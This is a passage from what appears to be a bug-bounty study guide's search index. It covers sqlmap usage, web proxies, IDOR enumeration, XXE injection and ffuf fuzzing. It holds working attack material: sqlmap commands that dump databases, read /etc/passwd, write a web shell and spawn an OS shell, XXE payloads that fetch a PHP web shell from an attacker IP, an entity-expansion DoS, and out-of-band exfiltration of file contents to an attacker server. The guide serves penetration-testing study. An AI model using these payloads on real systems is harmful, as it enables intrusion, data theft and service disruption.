used) <code>sqlmap -u \"http://www.example.com/?id=1\" --dump-all --exclude-sysdbs</code> Dump all databases excluding system databases <code>sqlmap -u \"http://www.example.com/?id=1\" --banner --current-user --current-db --is-dba</code> Basic DB enumeration (version, current user/database name, if the current user has admin rights) <code>sqlmap -u \"http://www.example.com/?id=1\" --tables -D testdb</code> Table enumeration, specifying database name <code>sqlmap -u \"http://www.example.com/?id=1\" --dump -D testdb</code> Dump all tables <code>sqlmap -u \"http://www.example.com/?id=1\" --dump -T users -D testdb</code> Dump whole table, specifying table and database name <code>sqlmap -u \"http://www.example.com/?id=1\" --dump -T users -D testdb -C name,surname</code> Only dump specified columns <code>sqlmap -u \"http://www.example.com/?id=1\" --dump -T users -D testdb --start=2 --stop=3</code> Only dump specified rows <code>sqlmap -u \"http://www.example.com/?id=1\" --dump -T users -D testdb --where=\"name LIKE 'f%'\"</code> Conditional enumeration <code>sqlmap -u \"http://www.example.com/?id=1\" --schema</code> Database schema enumeration <code>sqlmap -u \"http://www.example.com/?id=1\" --search -T user</code> Searching for all tables containing user <code>sqlmap -u \"http://www.example.com/?id=1\" --search -C pass</code> Searching for all columns containing pass <code>sqlmap -u \"http://www.example.com/?id=1\" --search -T user</code> Searching for all tables containing user <code>sqlmap -u \"http://www.example.com/?id=1\" --passwords --batch</code> Password enumeration and cracking <code>sqlmap -u \"http://www.example.com/\" --data=\"id=1&amp;csrf-token=WfF1szMUHhiokx9AHFply5L2xAOfjRkE\" --csrf-token=\"csrf-token\"</code> Anti-CSRF token bypass <code>sqlmap -u \"http://www.example.com/?id=1&amp;rp=29125\" --randomize=rp</code> Unique value bypass <code>sqlmap -u \"http://www.example.com/?id=1&amp;h=c4ca4238a0b923820dcc509a6f75849b\" --eval=\"import hashlib; h=hashlib.md5(id).hexdigest()\"</code> Calculated parameter bypass <code>sqlmap --list-tampers</code> List all tamper scripts <code>sqlmap -u \"http://www.example.com/case1.php?id=1\" --is-dba</code> Check for DBA privileges <code>sqlmap -u \"http://www.example.com/?id=1\" --file-read \"/etc/passwd\"</code> Reading a local file <code>sqlmap -u \"http://www.example.com/?id=1\" --file-write \"shell.php\" --file-dest \"/var/www/html/shell.php\"</code> Writing a file <code>sqlmap -u \"http://www.example.com/?id=1\" --os-shell</code> Spawning an OS shell"},{"location":"bug-bounty-guide/sqlmap-essentials/#tips","title":"Tips","text":"<ul> <li>Increase risk when testing login forms to use OR payloads</li> <li>The '--all' switch in combination with the '--batch' switch, will automaically do the whole enumeration process on the target itself, and provide the entire enumeration details. </li> </ul>"},{"location":"bug-bounty-guide/sqlmap-essentials/#additional-flags","title":"Additional Flags","text":"Flag Description <code>--crawl</code>, <code>--forms</code> or <code>-g</code> Used for automatic parameter finding <code>--parse-errors</code> Display errors <code>--proxy</code> Send requests through a proxy like burp <code>--proxy-file</code> work sequentially through a list of proxies <code>--tor</code> Use tor as a proxy, needs tor running locally <code>--check-tor</code> Check tor proxy configured correctly <code>--code=200</code> Test for specific HTTP response code <code>--titles</code> Base comparison on the content of the <code>&lt;title&gt;</code> tag <code>--string=success</code> Check for specific string value in response <code>--not-string=error</code> Check for the lack of specified string in response <code>--text-only</code> Removes all HTML tags from response, basing comparison on only textual content <code>--technique=BEU</code> Specify techniques used (default BEUSTQ) <code>--union-cols=17</code> Specify the number of columns used in union queries (if known) <code>--union-char='a'</code> Specify dummy values for union queries <code>--union-from=users</code> Specify the FROM appendix for union queries <code>--no-cast</code> Don't use casting (CAST(value AS CHAR)) <code>--hex</code> Hex encode database response <code>--dump-format</code> Specify format to dump table in, e.g. HTML or SQLite <code>--skip-waf</code> Skip WAF check test <code>--chunked</code> Request body into chunks, blacklisted SQL keywords are split between chunks <code>--hpp</code> Payloads are split between different same parameter named values which are concatenated by the target platform if supporting it (e.g. ASP)"},{"location":"bug-bounty-guide/sqlmap-essentials/#common-sqlmap-tamper-scripts","title":"Common SQLMap Tamper Scripts","text":"Tamper-Script Description 0eunion Replaces UNION with e0UNION base64encode Base64-encodes all payload characters between Replaces &gt; with NOT BETWEEN 0 AND #; = with BETWEEN # AND # commalesslimit Replaces MySQL LIMIT M, N with LIMIT N OFFSET M equaltolike Replaces = with LIKE halfversionedmorekeywords Adds MySQL versioned comment before keywords modsecurityversioned Wraps query with MySQL versioned comment modsecurityzeroversioned Wraps query with MySQL zero-versioned comment percentage Adds % before each character (e.g., SELECT -&gt; %S%E%L%E%C%T) plus2concat Replaces + with MsSQL CONCAT() function randomcase Randomizes case of keyword characters (e.g., SELECT -&gt; SEleCt) space2comment Replaces space with comment <code>/*</code> space2dash Replaces space with dash comment (--) space2hash Replaces space with MySQL # comment space2mssqlblank Replaces space with MsSQL blank character space2plus Replaces space with plus (+) space2randomblank Replaces space with random blank character symboliclogical Replaces AND/OR with &amp;&amp;/ versionedkeywords Wraps non-function keywords with MySQL comment versionedmorekeywords Wraps all keywords with MySQL comment"},{"location":"bug-bounty-guide/using-web-proxies/","title":"Using Web Proxies","text":""},{"location":"bug-bounty-guide/using-web-proxies/#tools","title":"Tools","text":"<ul> <li>Burp Suite</li> <li>OWASP ZAP</li> <li>Foxy Proxy</li> <li>Proxychains</li> </ul>"},{"location":"bug-bounty-guide/using-web-proxies/#setup","title":"Setup","text":"<ul> <li>Configure proxy settings/install and configure foxy proxy</li> <li>Add certificate</li> </ul>"},{"location":"bug-bounty-guide/using-web-proxies/#tool-functions","title":"Tool Functions","text":"Function Burp ZAP Intercepting Requests Proxy tab, Intercept sub-tab, toggle on Toggle green button or [Ctrl+B] Intercept Response Proxy &gt; Options, enable Intercept Response Automatically enabled with intercept Automatic Modification Proxy &gt; Options &gt; Match and Replace, add rule [Ctrl+R] or Replacer in Options Repeating Requests [Ctrl+R] or right-click, send to Repeater Right-click, select Open/Resend URL Encoding Right-click, Convert Selection &gt; URL Encode, or [Ctrl+U] Auto-encodes request data before sending Decoding Decoder tab [Ctrl+E] Fuzzing https://academy.hackthebox.com/module/110/section/1054 https://academy.hackthebox.com/module/110/section/1056 Web Scanner https://academy.hackthebox.com/module/110/section/1084 https://academy.hackthebox.com/module/110/section/1086 Extensions https://portswigger.net/bappstore https://www.zaproxy.org/addons/ DOM Invader Available in integrated browser https://portswigger.net/burp/documentation/desktop/tools/dom-invader Burp Only"},{"location":"bug-bounty-guide/using-web-proxies/#burp-shortcuts","title":"Burp Shortcuts","text":"Shortcut Description [CTRL+R] Send to repeater [CTRL+SHIFT+R] Go to repeater [CTRL+I] Send to intruder [CTRL+SHIFT+I] Go to intruder [CTRL+U] URL encode [CTRL+SHIFT+U] URL decode"},{"location":"bug-bounty-guide/using-web-proxies/#zap-shortcuts","title":"ZAP Shortcuts","text":"Shortcut Description [CTRL+B] Toggle intercept on/off [CTRL+R] Go to replacer [CTRL+E] Go to encode/decode/hash"},{"location":"bug-bounty-guide/using-web-proxies/#firefox-shortcuts","title":"Firefox Shortcuts","text":"Shortcut Description [CTRL+SHIFT+R] Force Refresh Page [F12] Open Developer Tools [CTRL+SHIFT+I] Open Inspector [CTRL+SHIFT+E] Open Network Panel [CTRL+SHIFT+J] Open Console [CTRL+U] View Page Source"},{"location":"bug-bounty-guide/web-attacks/","title":"Web Attacks","text":""},{"location":"bug-bounty-guide/web-attacks/#http-verb-tampering","title":"HTTP Verb Tampering","text":""},{"location":"bug-bounty-guide/web-attacks/#http-request-methods","title":"HTTP Request Methods","text":"Verb Description HEAD Identical to a GET request, but its response only contains the headers, without the response body PUT Writes the request payload to the specified location DELETE Deletes the resource at the specified location OPTIONS Shows different options accepted by a web server, like accepted HTTP verbs PATCH Apply partial modifications to the resource at the specified location Command Description <code>-X OPTIONS</code> Set HTTP Method with Curl"},{"location":"bug-bounty-guide/web-attacks/#example-vulnerability","title":"Example Vulnerability","text":"<p>The below code is designed to mitigate SQLi. However, it is only being applied to GET requests</p> PHP<pre><code>$pattern = \"/^[A-Za-z\\s]+$/\";\n\nif(preg_match($pattern, $_GET[\"code\"])) {\n    $query = \"Select * from ports where port_code like '%\" . $_REQUEST[\"code\"] . \"%'\";\n    ...SNIP...\n}\n</code></pre>"},{"location":"bug-bounty-guide/web-attacks/#explointing","title":"Explointing","text":"<ul> <li>Trial and error change Verb in intercepted requests in burp.</li> <li><code>curl -i -X OPTIONS http://SERVER_IP:PORT/</code> to see what verbs are accepted.</li> </ul>"},{"location":"bug-bounty-guide/web-attacks/#insecure-direct-object-referencing-idor","title":"Insecure Direct Object Referencing (IDOR)","text":""},{"location":"bug-bounty-guide/web-attacks/#identify-idors","title":"Identify IDORs","text":"<ul> <li>In URL parameters &amp; APIs (<code>?uid=1</code> or <code>?filename=file_1.pdf</code>)</li> <li>In AJAX Calls (find functions only available to admin users) JavaScript<pre><code>function changeUserPassword() {\n    $.ajax({\n        url:\"change_password.php\",\n        type: \"post\",\n        dataType: \"json\",\n        data: {uid: user.uid, password: user.password, is_admin: is_admin},\n        success:function(result){\n            //\n        }\n    });\n}\n</code></pre></li> <li>By understanding reference hashing/encoding (<code>download.php?filename=c81e728d9d4c2f636f067f89cc14862c</code>) JavaScript<pre><code>$.ajax({\n    url:\"download.php\",\n    type: \"post\",\n    dataType: \"json\",\n    data: {filename: CryptoJS.MD5('file_1.pdf').toString()},\n    success:function(result){\n        //\n    }\n});\n</code></pre></li> <li>By comparing user roles and api calls available to users, user 2 may not have the below api call available but if we know it exists we could attempt to make it whilst logged in as user 2. JSON<pre><code>{\n  \"attributes\" : \n    {\n      \"type\" : \"salary\",\n      \"url\" : \"/services/data/salaries/users/1\"\n    },\n  \"Id\" : \"1\",\n  \"Name\" : \"User1\"\n\n}\n</code></pre></li> <li>Predictable file naming patterns HTML<pre><code>/documents/Invoice_1_09_2021.pdf\n/documents/Report_1_10_2021.pdf\n&lt;!-- changing the get parameter uid from 1 to 2 may cause the available files to change to: --&gt;\n/documents/Invoice_2_09_2021.pdf\n/documents/Report_2_10_2021.pdf\n&lt;!-- there may also be filters (uid_filter=1) that can be changed or removed to show other files --&gt;\n</code></pre></li> </ul>"},{"location":"bug-bounty-guide/web-attacks/#mass-idor-enumeration","title":"Mass IDOR Enumeration","text":"<p>If we find the example files from the previous example in the html code: HTML<pre><code>&lt;li class='pure-tree_link'&gt;&lt;a href='/documents/Invoice_3_06_2020.pdf' target='_blank'&gt;Invoice&lt;/a&gt;&lt;/li&gt;\n&lt;li class='pure-tree_link'&gt;&lt;a href='/documents/Report_3_01_2020.pdf' target='_blank'&gt;Report&lt;/a&gt;&lt;/li&gt;\n</code></pre> We could write the following script to mass download them Bash<pre><code>#!/bin/bash\n\nurl=\"$1\" # bash script.sh http://STMIP:STMPO or http://URL to run command and pass the URL\n\nfor i in {1..10}; do\n        for link in $(curl -s \"$url/documents.php?uid=$i\" | grep -oP \"\\/documents.*?.pdf\"); do # *? matches 0 or more of . (any char)\n                wget -q $url/$link # http://SERVER_IP:PORT/\n        done\ndone\n</code></pre></p>"},{"location":"bug-bounty-guide/web-attacks/#hashed-idor","title":"Hashed IDOR","text":"<p>The following function takes the IDOR value base64 encodes it and then hashes it. JavaScript<pre><code>function downloadContract(uid) {\n    $.redirect(\"/download.php\", {\n        contract: CryptoJS.MD5(btoa(uid)).toString(),\n    }, \"POST\", \"_self\");\n}\n</code></pre> In which case we would recreate that before passing the value: Bash<pre><code>echo -n 1 | base64 -w 0 | md5sum\n</code></pre> and pass the value to mass download files: Bash<pre><code>#!/bin/bash\n\nfor i in {1..10}; do\n    for hash in $(echo -n $i | base64 -w 0 | md5sum | tr -d ' -'); do\n        curl -sOJ -X POST -d \"contract=$hash\" http://SERVER_IP:PORT/download.php\n    done\ndone\n</code></pre></p>"},{"location":"bug-bounty-guide/web-attacks/#insecure-apis","title":"Insecure APIs","text":"<p> - The above API is making updates (PUT /profile/api.php/profile/1) to Full Name, Email, and About Me. - It has hidden parameters uid, uuid, and role. - The role is also present as a cookin (Cookie: role=employee) - We could try changing to a GET request and changing the endpoint to get other users details - If we found an admins uuid we could then use that alon with changing the uid and role to make changes/create users that we couldn't as a user role.</p> Command Description <code>md5sum</code> MD5 hash a string <code>base64</code> Base64 encode a string"},{"location":"bug-bounty-guide/web-attacks/#xml-external-entity-xxe-injection","title":"XML External Entity (XXE) Injection","text":"<p>Tip: May have to change GET request to POST request to add XML data</p>"},{"location":"bug-bounty-guide/web-attacks/#xml","title":"XML","text":"XML<pre><code>&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;\n&lt;email&gt;\n  &lt;date&gt;01-01-2022&lt;/date&gt;\n  &lt;time&gt;10:00 am UTC&lt;/time&gt;\n  &lt;sender&gt;john@inlanefreight.com&lt;/sender&gt;\n  &lt;recipients&gt;\n    &lt;to&gt;HR@inlanefreight.com&lt;/to&gt;\n    &lt;cc&gt;\n        &lt;to&gt;billing@inlanefreight.com&lt;/to&gt;\n        &lt;to&gt;payslips@inlanefreight.com&lt;/to&gt;\n    &lt;/cc&gt;\n  &lt;/recipients&gt;\n  &lt;body&gt;\n  Hello,\n      Kindly share with me the invoice for the payment made on January 1, 2022.\n  Regards,\n  John\n  &lt;/body&gt; \n&lt;/email&gt;\n</code></pre>"},{"location":"bug-bounty-guide/web-attacks/#xml-document-type-definition-dtd","title":"XML Document Type Definition (DTD)","text":"<p>Defines an XML documents structure/can be validated against</p> XML<pre><code>&lt;!DOCTYPE email [\n  &lt;!ELEMENT email (date, time, sender, recipients, body)&gt;\n  &lt;!ELEMENT recipients (to, cc?)&gt;\n  &lt;!ELEMENT cc (to*)&gt;\n  &lt;!ELEMENT date (#PCDATA)&gt;\n  &lt;!ELEMENT time (#PCDATA)&gt;\n  &lt;!ELEMENT sender (#PCDATA)&gt;\n  &lt;!ELEMENT to  (#PCDATA)&gt;\n  &lt;!ELEMENT body (#PCDATA)&gt;\n]&gt;\n</code></pre> <p>Referenced within the XML document itself</p> <p>XML<pre><code>&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;\n&lt;!DOCTYPE email SYSTEM \"email.dtd\"&gt;\n</code></pre> or XML<pre><code>&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;\n&lt;!DOCTYPE email SYSTEM \"http://inlanefreight.com/email.dtd\"&gt;\n</code></pre> Defining XML variables in DTD XML<pre><code>&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;\n&lt;!DOCTYPE email [\n  &lt;!ENTITY company \"Inlane Freight\"&gt;\n]&gt;\n</code></pre> The above defined company variable can be referenced in the XML document like this: <code>&amp;company;</code> Variables can also be referenced externally using the SYSTEM (or PUBLIC) keyword: XML<pre><code>&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;\n&lt;!DOCTYPE email [\n  &lt;!ENTITY company SYSTEM \"http://localhost/company.txt\"&gt;\n  &lt;!ENTITY signature SYSTEM \"file:///var/www/html/signature.txt\"&gt;\n]&gt;\n</code></pre></p>"},{"location":"bug-bounty-guide/web-attacks/#identification","title":"Identification","text":"<ul> <li>Find POST requests that contain XML data that accept user input<ul> <li>Even if a web app sends JSON data we can test if it will accept XML by changing the Content-Type header to application/xml</li> <li>Then convert the JSON data to XML with an online tool</li> </ul> </li> <li>Find which elements are displayed in the response once the request is sent</li> <li>Adjust the POST request to contain DTD and see if it gets reflected back </li> <li>Now test for LFI/the web app source code</li> </ul>"},{"location":"bug-bounty-guide/web-attacks/#exploitation","title":"Exploitation","text":"Code Description <code>&lt;!ENTITY xxe SYSTEM \"http://localhost/email.dtd\"&gt;</code> Define External Entity to a URL <code>&lt;!ENTITY xxe SYSTEM \"file:///etc/passwd\"&gt;</code> Define External Entity to a file path <code>&lt;!ENTITY company SYSTEM \"php://filter/convert.base64-encode/resource=index.php\"&gt;</code> Read PHP source code with base64 encode filter(for when referenced file is not returned because it's not in XML format) <code>&lt;!ENTITY company SYSTEM \"expect://curl$IFS-O$IFS'OUR_IP/shell.php'\"&gt;</code> Download a web shell into the remote server (requires expect module installed on php server) <p>Note: We replaced all spaces in the above XML code with $IFS, to avoid breaking the XML syntax. Furthermore, many other characters like |, &gt;, and { may break the code, so we should avoid using them.</p> <ul> <li>Preparing shell for download: Bash<pre><code>echo '&lt;?php system($_REQUEST[\"cmd\"]);?&gt;' &gt; shell.php\nsudo python3 -m http.server 80\n</code></pre></li> <li>SSRF style attacks can be performed to enumerate locally open ports/access restricted web pages</li> <li>Example DOS attack: XML<pre><code>&lt;?xml version=\"1.0\"?&gt;\n&lt;!DOCTYPE email [\n  &lt;!ENTITY a0 \"DOS\" &gt; &lt;!-- a0 Defined as DOS --&gt;\n  &lt;!ENTITY a1 \"&amp;a0;&amp;a0;&amp;a0;&amp;a0;&amp;a0;&amp;a0;&amp;a0;&amp;a0;&amp;a0;&amp;a0;\"&gt; &lt;!-- a0 referenced in a1 multiple times --&gt;\n  &lt;!ENTITY a2 \"&amp;a1;&amp;a1;&amp;a1;&amp;a1;&amp;a1;&amp;a1;&amp;a1;&amp;a1;&amp;a1;&amp;a1;\"&gt; &lt;!-- a1 referenced in a2 and so on to cause servers memory to run out --&gt;\n  &lt;!ENTITY a3 \"&amp;a2;&amp;a2;&amp;a2;&amp;a2;&amp;a2;&amp;a2;&amp;a2;&amp;a2;&amp;a2;&amp;a2;\"&gt;\n  &lt;!ENTITY a4 \"&amp;a3;&amp;a3;&amp;a3;&amp;a3;&amp;a3;&amp;a3;&amp;a3;&amp;a3;&amp;a3;&amp;a3;\"&gt;\n  &lt;!ENTITY a5 \"&amp;a4;&amp;a4;&amp;a4;&amp;a4;&amp;a4;&amp;a4;&amp;a4;&amp;a4;&amp;a4;&amp;a4;\"&gt;\n  &lt;!ENTITY a6 \"&amp;a5;&amp;a5;&amp;a5;&amp;a5;&amp;a5;&amp;a5;&amp;a5;&amp;a5;&amp;a5;&amp;a5;\"&gt;\n  &lt;!ENTITY a7 \"&amp;a6;&amp;a6;&amp;a6;&amp;a6;&amp;a6;&amp;a6;&amp;a6;&amp;a6;&amp;a6;&amp;a6;\"&gt;\n  &lt;!ENTITY a8 \"&amp;a7;&amp;a7;&amp;a7;&amp;a7;&amp;a7;&amp;a7;&amp;a7;&amp;a7;&amp;a7;&amp;a7;\"&gt;\n  &lt;!ENTITY a9 \"&amp;a8;&amp;a8;&amp;a8;&amp;a8;&amp;a8;&amp;a8;&amp;a8;&amp;a8;&amp;a8;&amp;a8;\"&gt;        \n  &lt;!ENTITY a10 \"&amp;a9;&amp;a9;&amp;a9;&amp;a9;&amp;a9;&amp;a9;&amp;a9;&amp;a9;&amp;a9;&amp;a9;\"&gt;        \n]&gt;\n&lt;root&gt;\n&lt;name&gt;&lt;/name&gt;\n&lt;tel&gt;&lt;/tel&gt;\n&lt;email&gt;&amp;a10;&lt;/email&gt;\n&lt;message&gt;&lt;/message&gt;\n&lt;/root&gt;\n</code></pre></li> </ul>"},{"location":"bug-bounty-guide/web-attacks/#advanced-exfiltration-with-cdata","title":"Advanced Exfiltration with CDATA","text":"<ul> <li>Exfil data wrapped in CDATA tag is considered raw data, thus special characters will not break the XML format.</li> <li>XML prevents joining internal and external entities </li> <li>This example exploit treats the internal entities as external entities: XML<pre><code>&lt;!DOCTYPE email [\n  &lt;!ENTITY % begin \"&lt;![CDATA[\"&gt; &lt;!-- prepend the beginning of the CDATA tag --&gt;\n  &lt;!ENTITY % file SYSTEM \"file:///var/www/html/submitDetails.php\"&gt; &lt;!-- reference external file --&gt;\n  &lt;!ENTITY % end \"]]&gt;\"&gt; &lt;!-- append the end of the CDATA tag --&gt;\n  &lt;!ENTITY % xxe SYSTEM \"http://OUR_IP:8000/xxe.dtd\"&gt; &lt;!-- reference our external DTD --&gt;\n  %xxe;\n]&gt;\n\n&lt;email&gt;&amp;joined;&lt;/email&gt; &lt;!-- reference the &amp;joined; entity to print the file content --&gt;\n</code></pre> Bash<pre><code>echo '&lt;!ENTITY joined \"%begin;%file;%end;\"&gt;' &gt; xxe.dtd\npython3 -m http.server 8000\n</code></pre></li> </ul>"},{"location":"bug-bounty-guide/web-attacks/#error-based-xxe-example","title":"Error Based XXE Example","text":"<ul> <li>Post request: XML<pre><code>&lt;!DOCTYPE email [ \n  &lt;!ENTITY % remote SYSTEM \"http://OUR_IP:8000/xxe.dtd\"&gt;\n  %remote;\n  %error;\n]&gt;\n</code></pre></li> <li>Remote file xxe.dtd: Bash<pre><code>cat &gt; XXE.dtd &lt;&lt; EOF\n&lt;!ENTITY % file SYSTEM \"file:///flag.php\"&gt;\n&lt;!ENTITY % error \"&lt;!ENTITY content SYSTEM '%nonExistingEntity;/%file;'&gt;\"&gt;\nEOF\npython3 -m http.server 8000\n</code></pre></li> </ul>"},{"location":"bug-bounty-guide/web-attacks/#out-of-band-data-exfiltration","title":"Out-of-band Data Exfiltration","text":"<ul> <li>Post request: XML<pre><code>&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;\n&lt;!DOCTYPE email [ \n  &lt;!ENTITY % remote SYSTEM \"http://OUR_IP:8000/xxe.dtd\"&gt;\n  %remote;\n  %oob;\n]&gt;\n&lt;root&gt;&amp;content;&lt;/root&gt;\n</code></pre></li> <li>Remote file xxe.dtd: Bash<pre><code>cat &gt; xxe.dtd &lt;&lt; EOF\n&lt;!ENTITY % file SYSTEM \"php://filter/convert.base64-encode/resource=/flag.php\"&gt;\n&lt;!ENTITY % oob \"&lt;!ENTITY content SYSTEM 'http://PWNIP:4444/?content=%file;'&gt;\"&gt;\nEOF \npython3 -m http.server 8000\n</code></pre></li> <li>Auto base64 decoder Bash<pre><code>cat &gt; index.php &lt;&lt; EOF\n&lt;?php\nif(isset($_GET['content'])){\n    error_log(\"\\n\\n\" . base64_decode($_GET['content']));\n}\n?&gt;\nEOF\nphp -S 0.0.0.0:4444\n</code></pre></li> </ul> <p>Tip: In addition to storing our base64 encoded data as a parameter to our URL, we may utilize DNS OOB Exfiltration by placing the encoded data as a sub-domain for our URL (e.g. ENCODEDTEXT.our.website.com), and then use a tool like tcpdump to capture any incoming traffic and decode the sub-domain string to get the data.</p>"},{"location":"bug-bounty-guide/web-attacks/#automated-oob-exfiltration","title":"Automated OOB Exfiltration","text":"<p>XXEinjector</p> <ul> <li>Save HTTP POST request and add XXEINJECT at the end: Text Only<pre><code>POST /blind/submitDetails.php HTTP/1.1\nHost: 10.129.201.94\nContent-Length: 169\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)\nContent-Type: text/plain;charset=UTF-8\nAccept: */*\nOrigin: http://10.129.201.94\nReferer: http://10.129.201.94/blind/\nAccept-Encoding: gzip, deflate\nAccept-Language: en-US,en;q=0.9\nConnection: close\n\n&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;\nXXEINJECT\n</code></pre></li> <li>Run XXEinjector tool: Bash<pre><code>git clone https://github.com/enjoiz/XXEinjector.git\nruby XXEinjector.rb --host=[tun0 IP] --httpport=8000 --file=/tmp/xxe.req --path=/etc/passwd --oob=http --phpfilter\ncat Logs/10.129.201.94/etc/passwd.log\n</code></pre></li> </ul>"},{"location":"bug-bounty-guide/web-fuzzing/","title":"Web Fuzzing","text":""},{"location":"bug-bounty-guide/web-fuzzing/#what-is-web-fuzzing","title":"What is Web Fuzzing?","text":"<p>Web fuzzing injects large input sets into web applications to find vulnerabilities, hidden resources, or errors.</p> Target Description Hidden Directories/Files Discover unlinked paths Insecure APIs Identify unprotected endpoints SQL Injection Find injectable query points XSS Vulnerabilities Detect script injection flaws Command Injection Uncover system command exploits"},{"location":"bug-bounty-guide/web-fuzzing/#installing-tools","title":"Installing Tools","text":""},{"location":"bug-bounty-guide/web-fuzzing/#prerequisits","title":"Prerequisits","text":"<p>Installing Go, Python and PIPX</p> Bash<pre><code>sudo apt update\nsudo apt install -y golang\nsudo apt install -y python3 python3-pip\nsudo apt install pipx\npipx ensurepath\nsudo pipx ensurepath --global\n</code></pre>"},{"location":"bug-bounty-guide/web-fuzzing/#tools","title":"Tools","text":"Tool Description Use Cases FFUF Fast Go-based web fuzzer for enumeration. Directory/file enumeration, parameter discovery, brute-force attacks Gobuster Simple, fast web directory fuzzer. Content discovery, DNS subdomain enumeration, WordPress detection FeroxBuster Rust-based recursive content discovery tool. Recursive scanning, unlinked content discovery, high-performance scans wfuzz/wenum Versatile Python fuzzer for parameter testing. Directory/file enumeration, parameter discovery, brute-force attacks Bash<pre><code>go install github.com/ffuf/ffuf/v2@latest\ngo install github.com/OJ/gobuster/v3@latest\ncurl -sL https://raw.githubusercontent.com/epi052/feroxbuster/main/install-nix.sh | sudo bash -s $HOME/.local/bin\npipx install git+https://github.com/WebFuzzForge/wenum\npipx runpip wenum install setuptools\n</code></pre>"},{"location":"bug-bounty-guide/web-fuzzing/#miscellaneous-commands","title":"Miscellaneous Commands","text":"Command Description <code>sudo sh -c 'echo \"SERVER_IP academy.htb\" &gt;&gt; /etc/hosts'</code> Add DNS entry to hosts file <code>echo \"SERVER_IP academy.htb\" \\| sudo tee -a /etc/hosts</code> Add DNS entry to hosts file <code>for i in $(seq 1 1000); do echo $i &gt;&gt; ids.txt; done</code> Create numerical wordlist (1-1000) <code>curl http://admin.academy.htb:PORT/admin/admin.php -X POST -d 'id=key' -H 'Content-Type: application/x-www-form-urlencoded'</code> Send POST request with data"},{"location":"bug-bounty-guide/web-fuzzing/#seclists-wordlists","title":"SecLists Wordlists","text":"Wordlist Description <code>/usr/share/seclists/Discovery/Web-Content/common.txt</code> Common directory/file names <code>/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt</code> Extensive directory names <code>/usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt</code> Large directory collection <code>/usr/share/seclists/Discovery/Web-Content/big.txt</code> Comprehensive directory/files"},{"location":"bug-bounty-guide/web-fuzzing/#web-fuzzing-tips","title":"Web Fuzzing Tips","text":"Tip Explanation Choose Wordlists Select relevant wordlists for target Combine Wordlists Use multiple wordlists for breadth Customize Wordlists Tailor based on target knowledge Monitor Performance Adjust for resource-intensive lists Use Community Resources Leverage updated community wordlists"},{"location":"bug-bounty-guide/web-fuzzing/#parameter-fuzzing","title":"Parameter Fuzzing","text":"<ul> <li>Altering a product ID in a shopping cart URL could reveal pricing errors or unauthorized access to other users' orders.</li> <li>Modifying a hidden parameter in a request might unlock hidden features or administrative functions.</li> <li>Injecting malicious code into a search query could expose vulnerabilities like Cross-Site Scripting (XSS) or SQL Injection (SQLi).</li> </ul>"},{"location":"bug-bounty-guide/web-fuzzing/#rest-api-parameter-types","title":"Rest API Parameter Types","text":"Parameter Type Description Example Query Parameters Appended to URL after ? for filtering/sorting/pagination /users?limit=10&amp;sort=name Path Parameters Embedded in URL for specific resources /products/{id}pen_spark Request Body Parameters Sent in body of POST/PUT/PATCH for create/update { \"name\": \"New Product\", \"price\": 99.99 }"},{"location":"bug-bounty-guide/web-fuzzing/#graphql","title":"GraphQL","text":""},{"location":"bug-bounty-guide/web-fuzzing/#components","title":"Components","text":"Component Description Example Field Retrieves specific data (e.g., name, email) name, email Relationship Indicates connections between data types posts Nested Object Field returning another object for deeper traversal posts Argument Modifies query/field behavior (e.g., filter, sort) posts(limit: 5) <p>Example</p> JSON<pre><code>query {\n  user(id: 123) {\n    name\n    email\n    posts(limit: 5) {\n      title\n      body\n    }\n  }\n}\n</code></pre>"},{"location":"bug-bounty-guide/web-fuzzing/#mutations","title":"Mutations","text":"Component Description Example Operation Action to perform (e.g., createPost, updateUser) createPost Argument Input data for the operation (e.g., title, body) title: \"New Post\", body: \"This is the content of the new post\" Selection Fields to retrieve in response (e.g., id, title) <p>Example</p> JSON<pre><code>mutation {\n  createPost(title: \"New Post\", body: \"This is the content of the new post\") {\n    id\n    title\n  }\n}\n</code></pre>"},{"location":"bug-bounty-guide/web-fuzzing/#discovering-parameters","title":"Discovering Parameters","text":"<ul> <li>API documentation (Rest/graphql)</li> <li>WSDL Analysis (SOAP)</li> <li>Introspection (graphql)</li> <li>Network traffic analysis</li> <li>Parameter name fuzzing</li> </ul>"},{"location":"bug-bounty-guide/web-fuzzing/#fuzzing-apis","title":"Fuzzing APIs","text":"Bash<pre><code>git clone https://github.com/PandaSt0rm/webfuzz_api.git\ncd webfuzz_api\npip3 install -r requirements.txt\npython3 api_fuzzer.py http://IP:PORT\n</code></pre>"},{"location":"bug-bounty-guide/web-fuzzing/#ffuf","title":"FFUF","text":""},{"location":"bug-bounty-guide/web-fuzzing/#flags","title":"Flags","text":"Flag Use Example -u Specify target URL -u http://example.com/FUZZ -w Set wordlist file -w wordlist.txt -ic Ignore wordlist comments -ic -H Add custom HTTP headers -H \"Authorization: Bearer token\" -X Set HTTP method -X POST -e Extend wordlist with extensions -e .php,.html -s Enable silent mode -s -v Increase verbosity -v -t Set number of threads -t 50 -k Ignore SSL/TLS errors -k -o Output results to file -o results.txt -timeout Set request timeout in seconds -timeout 30 -recursion Enable recursive directory scanning -recursion -recursion-depth Set maximum recursion depth -recursion-depth 2 -s Filter by status codes -s 200,404 -mc Match by status codes -mc 200 -ml Match by line count -ml 50 -mw Match by word count -mw 100 -ms Match by size in bytes -ms 1024 -fc Filter by status codes -fc 404 -fl Filter by line count -fl 0 -fw Filter by word count -fw 0 -fs Filter by size in bytes -fs 512 -ac Automatically calibrate filtering -ac Command Description <code>ffuf -u http://example.com/FUZZ</code> Basic URL fuzzing <code>ffuf -u http://example.com/FUZZ -w wordlist.txt</code> Fuzz with wordlist <code>ffuf -u http://example.com/FUZZ -w wordlist.txt -ic</code> Ignore wordlist comments <code>ffuf -u http://example.com/FUZZ -w wordlist.txt -c</code> Colorize output <code>ffuf -u http://example.com/FUZZ -w wordlist.txt -mc 200</code> Filter by status code <code>ffuf -u http://example.com/FUZZ -w wordlist.txt -mr \"Welcome\"</code> Filter by regex pattern 